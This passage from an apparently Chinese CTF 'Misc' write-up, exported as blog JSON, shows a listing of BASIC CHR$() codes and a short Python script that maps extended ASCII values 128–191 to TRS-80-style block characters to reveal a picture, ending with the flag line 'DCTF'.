punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>一般我们处理的 ascii 码为 0-127，编号在 128～255 的是扩展的编码，原本就不是作为显示用的。要显示扩展 ASCII 码，则将执行这个程序的控制台的的代码页改为 437 (OEM－美国) 即可。</p>\n<p>这里我们用 TRS80 点阵集将他们略微做个替换。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVFJTLTgwX2NoYXJhY3Rlcl9zZXQ=\">TRS80 点阵字符</span></p>\n<p>最终脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>asciis <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"128\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠀\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"129\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠁\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"130\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠈\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"131\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠉\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"132\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠂\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"133\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠃\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"134\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠊\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"135\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠋\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"136\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠐\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"137\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠑\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"138\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠘\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"139\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠙\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"140\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠒\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"141\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠓\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"142\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠚\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"143\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠛\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"144\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠄\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"145\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠅\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"146\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠌\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"147\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠍\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"148\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠆\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"149\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠇\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"150\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠎\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"151\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠏\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"152\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠔\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"153\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠕\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"154\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠜\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"155\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠝\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"156\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠖\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"157\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠗\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"158\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠞\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"159\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠟\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>          <span class=\"token string\">\"160\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠠\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"161\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠡\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"162\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠨\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"163\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠩\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"164\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠢\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"165\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠣\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"166\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠪\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"167\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠫\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"168\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠰\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"169\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠱\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"170\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠸\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"171\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠹\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"172\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠲\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"173\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠳\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"174\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠺\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"175\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠻\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"176\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠤\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"177\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠥\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"178\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠬\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"179\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠭\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"180\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠦\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"181\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠧\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"182\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠮\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"183\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠯\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"184\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠴\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"185\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠵\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"186\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠼\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"187\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠽\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"188\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠶\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"189\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠷\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"190\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠾\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"191\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"⠿\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    lists<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> string_data <span class=\"token keyword\">in</span> lists<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 分割字符串并提取数字</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    numbers <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> token <span class=\"token keyword\">in</span> string_data<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'CHR$('</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">')'</span> <span class=\"token keyword\">in</span> token<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            number_str <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">')'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                number <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>number_str<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                numbers<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>numbers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\"># 打印提取出的数字</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> numbers<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\"># print(chr(num),end='')</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">13</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>asciis<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p e529333c-21d8-48fe-80a7-04ba7ec14a3b=\"\">flag:DCTF</p>\n",
            "tags": [
                "CTF",
                "高贵的Misc",
                "php是世界上最好的语言",
                "又坐牢了"
            ]
        }
    ]
}